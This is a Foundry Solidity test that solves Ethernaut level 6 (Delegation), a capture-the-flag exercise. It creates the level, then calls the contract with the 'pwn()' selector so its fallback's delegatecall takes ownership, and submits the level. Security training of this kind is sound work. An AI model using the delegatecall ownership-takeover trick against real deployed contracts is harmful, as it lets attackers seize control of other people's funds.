// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/06-Delegation/DelegationFactory.sol";
import "../src/Ethernaut.sol";

contract DelegationTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);
    address toAddress = address(9256);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 5 ether);
    }

    function testDelegation() public {
        // Level setup
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        // Level attack
        (bool success, ) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()", ""));
        assertTrue(success);

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
